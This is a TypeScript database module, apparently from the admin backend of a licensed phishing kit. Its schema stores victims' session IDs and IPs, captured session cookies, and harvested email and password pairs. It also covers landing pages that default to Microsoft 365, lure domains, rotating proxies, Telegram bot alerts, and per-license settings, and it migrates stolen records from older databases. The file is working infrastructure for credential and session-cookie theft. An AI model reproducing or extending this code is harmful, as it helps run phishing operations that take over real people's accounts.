// lib/db.ts
// One SQLite database, one Drizzle connection. The legacy export names remain
// as aliases so older pages can migrate gradually without splitting storage.

import BetterSqlite3 from "better-sqlite3";
import { drizzle } from "drizzle-orm/better-sqlite3";
import fs from "fs";
import path from "path";
import * as mainSchema from "./schema/main.schema";
import * as configSchema from "./schema/config.schema";
import * as securitySchema from "./schema/security.schema";

const dbDir = path.join(/* turbopackIgnore: true */ process.cwd(), "db");
if (!fs.existsSync(dbDir)) {
  fs.mkdirSync(dbDir, { recursive: true });
}

function buildDb() {
  const sqlite = new BetterSqlite3(path.join(dbDir, "ceadmin.db"));
  sqlite.pragma("journal_mode = WAL");
  sqlite.pragma("foreign_keys = ON");

  sqlite.exec(`
    CREATE TABLE IF NOT EXISTS clients (
      sessionId TEXT PRIMARY KEY,
      client_ip TEXT NOT NULL,
      first_seen TEXT NOT NULL,
      last_seen TEXT NOT NULL
    );
    CREATE TABLE IF NOT EXISTS client_cookies (
      sessionId TEXT NOT NULL,
      timestamp TEXT NOT NULL,
      cookies TEXT NOT NULL,
      FOREIGN KEY(sessionId) REFERENCES clients(sessionId)
    );
    CREATE TABLE IF NOT EXISTS credentials (
      sessionId TEXT NOT NULL,
      timestamp TEXT NOT NULL,
      email TEXT NOT NULL,
      password TEXT NOT NULL,
      country TEXT NOT NULL DEFAULT 'Unknown',
      FOREIGN KEY(sessionId) REFERENCES clients(sessionId)
    );
    CREATE TABLE IF NOT EXISTS settings (
      key TEXT PRIMARY KEY,
      value TEXT NOT NULL DEFAULT ''
    );
    CREATE TABLE IF NOT EXISTS tokens (
      token TEXT PRIMARY KEY,
      created_at INTEGER DEFAULT (strftime('%s','now'))
    );
    CREATE TABLE IF NOT EXISTS tracking_cookies (
      cookie_value TEXT PRIMARY KEY,
      ip TEXT NOT NULL,
      created_at INTEGER DEFAULT (strftime('%s','now'))
    );
    CREATE TABLE IF NOT EXISTS ip_log (
      ip TEXT PRIMARY KEY,
      timestamp INTEGER NOT NULL
    );
    CREATE TABLE IF NOT EXISTS licenses (
      license_id TEXT PRIMARY KEY,
      password_hash TEXT,
      expires_at TEXT NOT NULL,
      created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
      updated_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS admin_sessions (
      session_token_hash TEXT PRIMARY KEY,
      license_id TEXT NOT NULL,
      expires_at TEXT NOT NULL,
      created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
      last_seen_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY(license_id) REFERENCES licenses(license_id)
    );
    CREATE TABLE IF NOT EXISTS proxy_settings (
      license_id TEXT PRIMARY KEY,
      use_proxy TEXT NOT NULL DEFAULT 'enabled',
      rotation_method TEXT NOT NULL DEFAULT 'sticky',
      updated_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY(license_id) REFERENCES licenses(license_id)
    );
    CREATE TABLE IF NOT EXISTS proxies (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      license_id TEXT NOT NULL,
      proxy_type TEXT NOT NULL,
      username TEXT NOT NULL,
      password TEXT NOT NULL,
      ip_address TEXT NOT NULL,
      port INTEGER NOT NULL,
      created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY(license_id) REFERENCES licenses(license_id)
    );
    CREATE TABLE IF NOT EXISTS domains (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      license_id TEXT NOT NULL,
      domain TEXT NOT NULL,
      domain_dns TEXT NOT NULL,
      subdomain TEXT NOT NULL,
      path TEXT NOT NULL,
      created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY(license_id) REFERENCES licenses(license_id)
    );
    CREATE TABLE IF NOT EXISTS telegram_notifications (
      license_id TEXT PRIMARY KEY,
      chat_id TEXT NOT NULL DEFAULT '',
      bot_token TEXT NOT NULL DEFAULT '',
      updated_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY(license_id) REFERENCES licenses(license_id)
    );
    CREATE TABLE IF NOT EXISTS landing_pages (
      license_id TEXT PRIMARY KEY,
      service TEXT NOT NULL DEFAULT 'Microsoft 365',
      domain_id INTEGER,
      updated_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY(license_id) REFERENCES licenses(license_id)
    );
    CREATE TABLE IF NOT EXISTS default_services (
      license_id TEXT PRIMARY KEY,
      service TEXT NOT NULL DEFAULT 'Microsoft 365',
      updated_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY(license_id) REFERENCES licenses(license_id)
    );
    CREATE TABLE IF NOT EXISTS single_link_settings (
      license_id TEXT PRIMARY KEY,
      option TEXT NOT NULL DEFAULT 'disabled',
      updated_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY(license_id) REFERENCES licenses(license_id)
    );
    CREATE TABLE IF NOT EXISTS captcha_settings (
      license_id TEXT PRIMARY KEY,
      option TEXT NOT NULL DEFAULT 'disabled',
      updated_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY(license_id) REFERENCES licenses(license_id)
    );
    CREATE TABLE IF NOT EXISTS legacy_migrations (
      name TEXT PRIMARY KEY,
      migrated_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
    );
  `);

  migrateLegacyDatabases(sqlite);

  const defaults: Record<string, string> = {
    BOT_TOKEN: "",
    CHAT_ID: "",
    H_KEY: "",
    R_KEY: "",
    LANDING_URL: "",
  };
  const insert = sqlite.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)");
  for (const [key, value] of Object.entries(defaults)) {
    insert.run(key, value);
  }

  return drizzle(sqlite, {
    schema: { ...mainSchema, ...configSchema, ...securitySchema },
  });
}

function migrateLegacyDatabases(sqlite: BetterSqlite3.Database) {
  const migrations = sqlite.prepare("SELECT name FROM legacy_migrations WHERE name = ?").pluck();
  const mark = sqlite.prepare("INSERT OR IGNORE INTO legacy_migrations (name) VALUES (?)");

  const legacyPlans = [
    {
      name: "ceng.db",
      file: path.join(dbDir, "ceng.db"),
      statements: [
        "INSERT OR IGNORE INTO clients SELECT sessionId, client_ip, first_seen, last_seen FROM legacy.clients",
        "INSERT INTO client_cookies SELECT sessionId, timestamp, cookies FROM legacy.client_cookies",
        "INSERT INTO credentials SELECT sessionId, timestamp, email, password, country FROM legacy.credentials",
      ],
    },
    {
      name: "config.db",
      file: path.join(dbDir, "config.db"),
      statements: ["INSERT OR IGNORE INTO settings SELECT key, value FROM legacy.settings"],
    },
    {
      name: "security.db",
      file: path.join(dbDir, "security.db"),
      statements: [
        "INSERT OR IGNORE INTO tokens SELECT token, created_at FROM legacy.tokens",
        "INSERT OR IGNORE INTO tracking_cookies SELECT cookie_value, ip, created_at FROM legacy.tracking_cookies",
        "INSERT OR IGNORE INTO ip_log SELECT ip, timestamp FROM legacy.ip_log",
      ],
    },
  ];

  for (const plan of legacyPlans) {
    if (!fs.existsSync(plan.file) || migrations.get(plan.name)) continue;
    sqlite.exec(`ATTACH DATABASE '${plan.file.replaceAll("'", "''")}' AS legacy`);
    try {
      sqlite.transaction(() => {
        for (const statement of plan.statements) {
          try {
            sqlite.exec(statement);
          } catch {
            // Legacy installs may be partially initialized; skip missing tables.
          }
        }
        mark.run(plan.name);
      })();
    } finally {
      sqlite.exec("DETACH DATABASE legacy");
    }
  }
}

export type AppDb = ReturnType<typeof buildDb>;

declare global {
  // eslint-disable-next-line no-var
  var _appDb: AppDb | undefined;
}

const appDb = process.env.NODE_ENV === "production" ? buildDb() : (global._appDb ??= buildDb());

export const db = appDb;
export const mainDb = appDb;
export const configDb = appDb;
export const securityDb = appDb;
